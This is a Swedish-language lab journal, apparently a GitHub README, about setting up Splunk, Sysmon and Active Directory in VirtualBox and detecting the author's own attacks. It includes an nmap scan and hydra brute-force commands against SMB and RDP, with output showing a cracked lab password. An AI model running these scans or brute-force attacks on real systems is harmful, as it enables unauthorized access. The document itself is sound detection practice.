# VM-labb med fokus på Splunk

## 2026-03-03

Jag håller på sätta upp en labbmiljö i Virtualbox för att installera, konfigurera och testa Splunk och samtidigt kunna se mina egna attacker mot mer eller mindre sårbara enheter.

Jag har utgått från [det här repot](https://github.com/avulman/active-directory-project). Men har varit tvungen att modifiera mycket då det fanns en hel del fel i instruktionerna och de var inte alltid speciellt tydliga, så mycket fick man lära sig under tiden.

Såhär ser det ut i dagsläget, de markerade maskinerna är installerade och nästan färdigkonfigurerade. Åtminstone Universal Forwarders är på plats. Jag har lite problem med att indexera både Windows 10 och Windows Server 2022 till 'endpoints'. Men det ska nog gå att lösa snart. WinServ2022 vill fungera och skicka till endpoint, men inte Windows 10. Nedan finns en skärmdump som visar det.

Uppdatering 10 minuter senare, ibland är det smart att lägga upp misstag på Github. Då ser man att man döpt filen till input istället för inputs. Det var antagligen problemet. Men nu är allt ominstallerat och fungerar!

Sedan ska jag konfigurera lite Active Directory-grejer på servern. Förhoppningsvis snart.

![Virtualbox](<Screenshots/Skärmbild 2026-03-03 185905.png>)

![Win10 vill inte](<Screenshots/Skärmbild 2026-03-03 191817.png>)

Och så lyckades jag fixa det!

![Win10 vill!](<Screenshots/Skärmbild 2026-03-03 195844.png>)

## 2026-03-06 - Active Directory

Nu är det dags att sätta upp Active Directory. Jag går via Server Manager och väljer Add Roles and Features och följer installations-wizarden.

Min nya forest får heta testdomain.local. Datorn startas om och allt ser ut att vara i ordning.

![TESTDOMAIN-Admin](<Screenshots/Skärmbild 2026-03-06 094958.png>)

Nu lägger vi till Windows 10-maskinen i Active Directory. Börjar med att skapa ett par nya Organizational Units som heter IT och HR. Skapar ett par användare för framtida användning.

Nu ska vi gå med i domänen med Windows10-datorn, så jag använder Advanced System Settings och under Computer Name väljer jag domänen vi skapade (TESTDOMAIN.LOCAL). Innan jag trycker på OK måste jag konfigurera DNS-inställningen, så jag ändrar DNS till min Windows2022-server, i det här fallet 192.168.100.110. Sedan fyller jag i användarnamn och lösenord, det blev min HR-användare.

![Windows10 login](<Screenshots/Skärmbild 2026-03-06 102509.png>)

Allt verkar fungera.

Nu har jag en testmiljö som jag kan leka med senare. Planen är att utföra diverse attacker och sedan undersöka dessa i Splunk.


## 2026-05-14 - Nya tag!

Jag organiserade om, för då jag skulle läsa min egen dagbok imorse så hade jag hellre haft det äldsta inlägget först. Så vi kör så nu.

Hur som helst, jag startade upp det gamla labbet igen och tänkte försöka testa lite i Splunk. Det första som hände var att min licens hade gått ut så jag fick byta till free version, får hoppas att det funkar för mina labbar, kanske måste konfigurera om vad som ska loggas eftersom man är begränsad till 500 mb eller något per dag.

Jag insåg på vägen att sysmon i dagsläget inte loggar ping, vilket var det första jag ville se om jag kunde se i Splunk. Och det verkar inte riktigt vara möjligt genom sysmon så jag tänkte fixa konfigurationen så jag åtminstone borde upptäcka en nmap-scan. Det gör jag genom följande

    notepad C:\Users\Administrator\Downloads\sysmonconfig.xml

Vi letar rätt på NetworkConnect-blocket (EventCode=3) och lägger till <code>\<DestinationIp condition="is">192.168.10.110\</DestinationIp></code> på slutet.

Det här fungerade inte som jag hade hoppats. Jag får det inte att fungera, Splunk vill inte visa fastän jag får fram det i min Eventviewer. Jag kommer byta till en annan sysmonconfig och hoppas det hjälper.

![EventViewer ser nmap](<Screenshots/Skärmbild 2026-05-14 091618 - EventViewer.png>)

Det blir att ladda hem [en respekterad sysmonconfig](https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml) och så håller vi tummarna.

Det fungerade inte, sysmon verkar inte vilja visa upp nätverksgrejer i Splunk av någon anledning, så för att komma vidare kör jag på ett annat spår. Startar loggning via brandväggen istället.


    Set-NetFirewallProfile -Profile Domain,Public,Private -LogFileName "C:\Windows\System32\LogFiles\Firewall\pfirewall.log" -LogMaxSizeKilobytes 32767 -LogAllowed True -LogBlocked True

Lägger till

    [monitor://C:\Windows\System32\LogFiles\Firewall\pfirewall.log]
    index = endpoint
    sourcetype = wineventlog-firewall
    disabled = false

För det verkar inte gå med Sysmon. Testar den här vägen istället då.

![Nmap från Kali](<Screenshots/Skärmbild 2026-05-14 102633 - nmap från kali.png>)

![Nmaptrafik syns](<Screenshots/Skärmbild 2026-05-14 102355 - nmap syns i splunk till slut.png>)

Ja, det här fungerade ju. Sökningen skrevs av AI för att få fram det i en snygg tabell.

    index=endpoint sourcetype=wineventlog-firewall 192.168.10.7
    | rex "(?P<action>\w+)\s+(?P<protocol>\w+)\s+(?P<src_ip>\d+\.\d+\.\d+\.\d+)\s+(?P<dst_ip>\d+\.\d+\.\d+\.\d+)\s+(?P<src_port>\d+)\s+(?P<dst_port>\d+)"
    | table _time, src_ip, src_port, dst_ip, dst_port, action, protocol

Det här var ju på tok för komplicerat för att kunna se något så enkelt som en nmap-sökning mot min maskin. Jag kommer labba vidare och försöka bryta mig in någonstans med brute force och försöka se det via Splunk sen också. Hoppas det inte blir fullt lika jobbigt bara.

# 2026-05-15 - Ny dag, testa lite brute force bl.a.

Jag vill testa göra en brute force-attack och se den i min Splunk, så jag öppnar med en nmap scan.

    nmap -A 192.168.10.110 
    Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-15 04:28 -0400
    Nmap scan report for 192.168.10.110
    Host is up (0.00092s latency).
    Not shown: 988 filtered tcp ports (no-response)
    PORT     STATE SERVICE       VERSION
    53/tcp   open  domain        Simple DNS Plus
    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-15 08:28:25Z)
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: testdomain.local, Site: Default-First-Site-Name)
    445/tcp  open  microsoft-ds?
    464/tcp  open  kpasswd5?
    593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp  open  tcpwrapped
    3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: testdomain.local, Site: Default-First-Site-Name)
    3269/tcp open  tcpwrapped
    5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    MAC Address: 08:00:27:19:DB:5B (Oracle VirtualBox virtual NIC)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 2022|11|2016 (97%)
    OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2016
    Aggressive OS guesses: Microsoft Windows Server 2022 (97%), Microsoft Windows 11 24H2 (90%), Microsoft Windows 11 21H2 (90%), Microsoft Windows Server 2016 (89%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 1 hop
    Service Info: Host: WINSERV2022; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_nbstat: NetBIOS name: WINSERV2022, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:19:db:5b (Oracle VirtualBox virtual NIC)
    | smb2-security-mode: 
    |   3.1.1: 
    |_    Message signing enabled and required
    |_clock-skew: 1s
    | smb2-time: 
    |   date: 2026-05-15T08:28:29
    |_  start_date: N/A

    TRACEROUTE
    HOP RTT     ADDRESS
    1   0.92 ms 192.168.10.110

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 58.33 seconds

Vi provar köra en hydra mot SMB, det borde synas.

    hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.10.110 smb
    Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-15 04:31:16
    [INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
    [DATA] max 1 task per 1 server, overall 1 task, 5299994 login tries (l:1/p:5299994), ~5299994 tries per task
    [DATA] attacking smb://192.168.10.110:445/
    [ERROR] invalid reply from target smb://192.168.10.110:445/

Det gick ju inte. Jag öppnar RDP istället på Windowsdatorn. Jag kör följande via Powershell.

    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

En ny nmap för att se om det är öppet.

    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    | ssl-cert: Subject: commonName=winserv2022.testdomain.local
    | Not valid before: 2026-05-14T08:34:45
    |_Not valid after:  2026-11-13T08:34:45
    | rdp-ntlm-info: 
    |   Target_Name: TESTDOMAIN
    |   NetBIOS_Domain_Name: TESTDOMAIN
    |   NetBIOS_Computer_Name: WINSERV2022
    |   DNS_Domain_Name: testdomain.local
    |   DNS_Computer_Name: winserv2022.testdomain.local
    |   DNS_Tree_Name: testdomain.local
    |   Product_Version: 10.0.20348
    |_  System_Time: 2026-05-15T08:35:35+00:00
    |_ssl-date: 2026-05-15T08:36:08+00:00; -4s from scanner time.

Ser ganska öppet ut. Nu kör vi hydra igen!

    hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.10.110 rdp  
    Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-15 04:37:33
    [WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
    [INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
    [WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
    [DATA] max 4 tasks per 1 server, overall 4 tasks, 5299994 login tries (l:1/p:5299994), ~1324999 tries per task
    [DATA] attacking rdp://192.168.10.110:3389/
    [ERROR] freerdp: The connection failed to establish.
    [ERROR] freerdp: The connection failed to establish.
    [ERROR] freerdp: The connection failed to establish.
    [ERROR] freerdp: The connection failed to establish.
    [ERROR] freerdp: The connection failed to establish.

Men se där, här syns det i Splunk!

![Brute Force Fail](<Screenshots/Skärmbild 2026-05-15 104101 - brute force failure.png>)

Nu ska jag testa Brute Force med ett konto som borde fungera. Skapar en användare som heter mrf och ger den lösenordet Password1234, det ska finnas med i rockyou.txt, så nu borde vi komma in. 

    grep Password1234 /usr/share/wordlists/rockyou.txt                   
    Password1234


![Ny användare](<Screenshots/Skärmbild 2026-05-15 104334 - ny användare i AD.png>)

Efter jag påbörjat så insåg jag följande.

    grep -n "Password1234" /usr/share/wordlists/rockyou.txt
    539155:Password1234

Och jag vill inte vänta i 100 timmar på hydra att komma till nummer 539155, så jag gör min egen passwordlist.

    cat passwordlist.txt                
    Password
    Password1
    Password12
    Password123
    Password1234

Rimligtvis borde det gå lite fortare nu!

    hydra -l mrf -P passwordlist.txt 192.168.10.110 rdp 
    Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-15 04:50:08
    [WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
    [INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
    [WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
    [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
    [DATA] max 4 tasks per 1 server, overall 4 tasks, 6 login tries (l:1/p:6), ~2 tries per task
    [DATA] attacking rdp://192.168.10.110:3389/
    [ERROR] freerdp: The connection failed to establish.
    [ERROR] freerdp: The connection failed to establish.
    [3389][rdp] account on 192.168.10.110 might be valid but account not active for remote desktop: login: mrf password: Password1234, continuing attacking the account.
    1 of 1 target completed, 0 valid password found
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-15 04:50:20

Se där, nu ska jag prova aktivera kontot för RDP så kanske vi tar oss in också! Efter lite strul så modifierade jag mitt hydra-kommando också, men det gick vägen!

    hydra -l mrf -P passwordlist.txt -t 1 -W 3 192.168.10.110 rdp
    Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-15 04:55:53
    [WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
    [DATA] max 1 task per 1 server, overall 1 task, 6 login tries (l:1/p:6), ~6 tries per task
    [DATA] attacking rdp://192.168.10.110:3389/
    [3389][rdp] host: 192.168.10.110   login: mrf   password: Password1234
    1 of 1 target successfully completed, 1 valid password found
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-15 04:56:18

![Lyckad inloggning](<Screenshots/Skärmbild 2026-05-15 111208 - Lyckad inloggning.png>)

Kul! Men en del grejer är lite märkliga. Så som jag har Splunk konfigurerat just nu så är det lite svårt att få fram exakta matchningar med mina sökningar och att få fram den informationen jag vill kräver ofta att jag gräver djupare bland alla lines som finns i eventet. Jag har förstått att det finns vissa addons som ska göra allt mer normaliserat och smidigare. Så nästa steg är nog att prova det!

Tillägget verkar ha gjort det lite smidigare med vissa namn på sökningar osv, vet inte hur stor skillnad det faktiskt gjorde. Men jag provade också sätta upp en dashboard med lyckade och misslyckade inloggningar, det blev ganska okej ändå!

![Dashboard](<Screenshots/Skärmbild 2026-05-15 115044 - dashboard test.png>)